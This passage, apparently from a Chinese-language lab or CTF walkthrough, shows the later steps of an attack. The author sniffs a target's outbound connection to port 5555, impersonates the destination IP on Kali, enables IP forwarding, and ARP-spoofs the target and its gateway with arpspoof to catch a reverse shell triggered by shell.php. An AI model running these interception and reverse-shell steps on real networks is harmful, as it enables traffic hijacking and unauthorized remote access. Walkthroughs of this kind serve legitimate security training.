![](../Images/919fc875fb82a81b571dd3d4e19db6b2.png)

#### 8.访问页面并尝试抓包

发现192.168.207.143有连接到192.168.1.14的TCP 5555端口

![](../Images/9e8da0870453dcb1d5484c13c7c60dc0.png)

#### 9.Kali配置欺骗环境

在kali中添加一个IP地址

```
ip addr add 192.168.1.14/24 dev eth0
```

![](../Images/1470f1ea5b914806d0aa63e4cbb41a92.png)

开启端口转发

```
echo 1 > /proc/sys/net/ipv4/ip\_forward
```

![](../Images/becbc0eb27f33c5c805e6a98faf3be4b.png)

#### 10.使用arp欺骗攻击

kali开启端口监听TCP 5555端口

![](../Images/93d02da408465a016b07d6154a8dbf53.png)

开启ARP欺骗攻击

```


arpspoof -i eth0 -t 192.168.207.143 192.168.207.2
```

由于反弹shell连接时，发起请求的源IP地址为靶机IP地址`192.168.207.143`，访问的目的地址为`192.168.1.14`与靶机非同网段，需要欺骗靶机伪造虚拟网关MAC把跨网段流量转发给Kali

![](../Images/063c356df2a12743c576a64bfd4cf887.png)

#### 11.访问shell.php

访问shell.php后获取到反弹shell连接

![](../Images/cbbdbc8a0352795807aa8ed2c5653566.png)
